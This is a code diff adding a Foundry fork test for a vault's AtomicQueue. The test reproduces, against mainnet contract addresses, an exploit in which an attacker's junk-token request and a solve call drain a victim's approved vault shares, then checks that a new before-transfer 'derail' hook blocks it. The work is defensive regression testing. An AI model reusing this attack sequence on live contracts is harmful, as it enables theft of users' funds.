@@ -241,3 +241,91 @@ contract AtomicQueueDerailBeforeTransferHookTest is Test {
         );
     }
 }
+
+contract AtomicQueueDerailBeforeTransferHookForkTest is Test {
+    BoringVault internal constant BORING_VAULT = BoringVault(payable(0x196ead472583Bc1e9aF7A05F860D9857e1Bd3dCc));
+    AtomicQueue internal constant ATOMIC_QUEUE = AtomicQueue(0xc7287780bfa0C5D2dD74e3e51E238B1cd9B221ee);
+    uint256 internal constant FORK_BLOCK = 25_943_286; // A state of the vault before we introduced the temporary freeze
+    // hook
+
+    MockERC20 internal junkToken;
+    PassiveSmartAccount internal victim;
+
+    address internal attacker = vm.addr(0xA11CE);
+
+    uint256 internal constant VICTIM_SHARES = 100e18;
+    uint256 internal constant ATTACKER_OFFER = 1e18;
+
+    function setUp() external {
+        vm.selectFork(vm.createFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK));
+
+        junkToken = new MockERC20("Junk", "JUNK", 18);
+        victim = new PassiveSmartAccount();
+
+        deal(address(BORING_VAULT), address(victim), VICTIM_SHARES);
+        vm.prank(address(victim));
+        BORING_VAULT.approve(address(ATOMIC_QUEUE), type(uint256).max);
+
+        junkToken.mint(attacker, ATTACKER_OFFER);
+        vm.startPrank(attacker);
+        junkToken.approve(address(ATOMIC_QUEUE), type(uint256).max);
+        ATOMIC_QUEUE.updateAtomicRequest(
+            ERC20(address(junkToken)),
+            ERC20(address(BORING_VAULT)),
+            AtomicQueue.AtomicRequest({
+                deadline: uint64(block.timestamp + 1 days),
+                atomicPrice: uint88(VICTIM_SHARES),
+                offerAmount: uint96(ATTACKER_OFFER),
+                inSolve: false
+            })
+        );
+        vm.stopPrank();
+    }
+
+    function testForkAttackDrainsApprovedShares() external {
+        assertEq(address(BORING_VAULT.hook()), address(0));
+
+        _executeAttackSolve();
+
+        assertEq(BORING_VAULT.balanceOf(attacker), VICTIM_SHARES);
+        assertEq(BORING_VAULT.balanceOf(address(victim)), 0);
+        assertEq(junkToken.balanceOf(address(victim)), ATTACKER_OFFER);
+    }
+
+    function testForkDerailHookPreventsAttack() external {
+        _installDerailHook();
+
+        vm.expectRevert(bytes("TRANSFER_FROM_FAILED"));
+        _executeAttackSolve();
+
+        assertEq(BORING_VAULT.balanceOf(attacker), 0);
+        assertEq(BORING_VAULT.balanceOf(address(victim)), VICTIM_SHARES);
+    }
+
+    function testForkTransfersStillWorkWithDerailHook() external {
+        _installDerailHook();
+
+        vm.prank(address(victim));
+        BORING_VAULT.transfer(attacker, 4e18);
+
+        assertEq(BORING_VAULT.balanceOf(attacker), 4e18);
+        assertEq(BORING_VAULT.balanceOf(address(victim)), VICTIM_SHARES - 4e18);
+    }
+
+    function _installDerailHook() internal {
+        AtomicQueueDerailBeforeTransferHook hook = new AtomicQueueDerailBeforeTransferHook(address(ATOMIC_QUEUE));
+
+        vm.prank(BORING_VAULT.owner());
+        BORING_VAULT.setBeforeTransferHook(address(hook));
+
+        assertEq(address(BORING_VAULT.hook()), address(hook));
+    }
+
+    function _executeAttackSolve() internal {
+        address[] memory users = new address[](1);
+        users[0] = attacker;
+
+        vm.prank(attacker);
+        ATOMIC_QUEUE.solve(ERC20(address(junkToken)), ERC20(address(BORING_VAULT)), users, hex"", address(victim));
+    }
+}
